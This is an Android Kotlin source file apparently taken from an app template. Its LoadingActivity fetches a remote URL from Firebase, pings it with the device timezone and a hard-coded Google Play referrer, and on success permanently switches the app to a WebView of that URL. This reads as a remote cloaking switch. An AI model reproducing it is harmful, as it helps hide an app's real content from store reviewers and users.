package com.template

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.template.databinding.ActivityLoadingBinding
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.net.URLEncoder
import java.util.TimeZone
import java.util.UUID

class LoadingActivity : AppCompatActivity() {

    private lateinit var binding: ActivityLoadingBinding
    private lateinit var firebaseAnalytics: FirebaseAnalytics
    private val preferences: SharedPreferences by lazy {  getSharedPreferences(
        "server_v1",
        Context.MODE_PRIVATE
    )}

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted: Boolean ->
        if (isGranted) {
            Toast.makeText(
                this, "Notifications permission granted", Toast.LENGTH_SHORT
            )
                .show()
        } else {
            Toast.makeText(
                this@LoadingActivity, "Your app will not show notifications",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        askNotificationPermission()
        firebaseAnalytics = Firebase.analytics

        if (isNetworkConnected()) {
            Log.d("xxx","Network = true")
            if (wasFireStoreUrlNullOrEmpty()) {
                Log.d("xxx","wasFireStoreUrlNullOrEmpty = true")
                startMainActivity()
            } else {
                Log.d("xxx", "wasFireStoreUrlNullOrEmpty = false")
                if (isFinalUrlExists()) {
                    Log.d("xxx", "isFinalUrlExists = true")
                    startWebActivity()
                } else {
                    if (isFireStoreUrl()) {
                        Log.d("xxx", "isFireStoreUrl = true")
                        startMainActivity()
                    } else {
                        Log.d("xxx", "isFinalUrlExists = false")
                        Firebase.database.reference.child("db").child("link").get()
                            .addOnSuccessListener {
                                val fireStoreUrl =
                                    kotlin.runCatching { it.value.toString() }.getOrNull()
                                Log.d(
                                    "xxx",
                                    "Made fireStoreUrl request. fireStoreUrl = $fireStoreUrl"
                                )
                                if (fireStoreUrl.isNullOrEmpty()) {
                                    println("isFireStoreUrlNullOrEmpty = true")
                                    saveWasFireStoreUrlNullOrEmpty()
                                    startMainActivity()
                                } else {
                                    Log.d("xxx", "isFireStoreUrlNullOrEmpty = false")
                                    saveFireStoreUrlPreferences(fireStoreUrl)
                                    makeRestApiRequest(fireStoreUrl)
                                }
                            }
                    }
                }
            }
        } else {
            Log.d("xxx","Network = false")
            if (isFinalUrlExists()) {
                Log.d("xxx","isFinalUrlExists = true")
                startWebActivity()
            } else {
                Log.d("xxx","isFinalUrlExists = false")
                startMainActivity()
            }
        }
    }

    private fun makeRestApiRequest(fireStoreUrl: String?) {
        println("makeRestApiRequest")
        val url = "$fireStoreUrl/?packageid=$packageName" +
                "&usserid=${UUID.randomUUID()}" +
                "&getz=${URLEncoder.encode(TimeZone.getDefault().id, "UTF-8")}" +
                "&getr=utm_source=google-play&utm_medium=organic"
        val client = OkHttpClient()
        val userAgent = System.getProperty("http.agent")
        val request: Request = Request
            .Builder().url(url)
            .header("User-Agent", userAgent)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.d("xxx","RestApiRequest onFailure")
                e.printStackTrace()
                startMainActivity()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    saveFinalUrlPreferences(url)
                    Log.d("xxx","RestApiRequest onSuccess")
                    startWebActivity()
                } else {
                    Log.d("xxx", "$url")
                    startMainActivity()
                }
            }
        })
    }

    private fun saveFireStoreUrlPreferences(fireStoreUrl: String?) {
        Log.d("xxx","save fireStoreUrl to preferences = $fireStoreUrl")
        val editor = preferences.edit()
        editor.putString("key_domain", fireStoreUrl)
        editor.apply()
    }

    private fun getFireStoreUrlPreferences(): String? {
        return preferences.getString("key_domain", null)
    }

    private fun isFireStoreUrl(): Boolean {
        return !getFireStoreUrlPreferences().isNullOrEmpty()
    }

    private fun wasFireStoreUrlNullOrEmpty(): Boolean {
        return preferences.getBoolean("wasFireStoreUrlNullOrEmpty", false)
    }

    private fun saveWasFireStoreUrlNullOrEmpty() {
        Log.d("xxx","save wasFireStoreUrlNullOrEmpty to preferences = true")
        val editor = preferences.edit()
        editor.putBoolean("wasFireStoreUrlNullOrEmpty", true)
        editor.apply()
    }


    private fun saveFinalUrlPreferences(url: String?) {
        Log.d("xxx","save finalUrl to preferences = $url")
        val editor = preferences.edit()
        editor.putString("url_key", url)
        editor.apply()
    }

    private fun getFinalUrlPreferences(): String? {
        return preferences.getString("url_key", null)
    }

    private fun isFinalUrlExists(): Boolean {
        return !getFinalUrlPreferences().isNullOrEmpty()
    }

    private fun startMainActivity() {
        Log.d("xxx","startMainActivity")
        val intent = Intent(this@LoadingActivity, MainActivity::class.java)
        startActivity(intent)
    }

    private fun startWebActivity() {
        Log.d("xxx","startWebActivity")
        WebActivity.start(
            this@LoadingActivity,
            getFinalUrlPreferences() ?: error("Must not be null")
        )
    }

    private fun isNetworkConnected(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    private fun askNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            when {
                ContextCompat.checkSelfPermission(
                    this, Manifest.permission.POST_NOTIFICATIONS
                ) == PackageManager.PERMISSION_GRANTED -> {
                }

                shouldShowRequestPermissionRationale(
                    Manifest.permission.POST_NOTIFICATIONS
                ) -> {
                }

                else -> {
                    requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                }
            }
        }
    }
}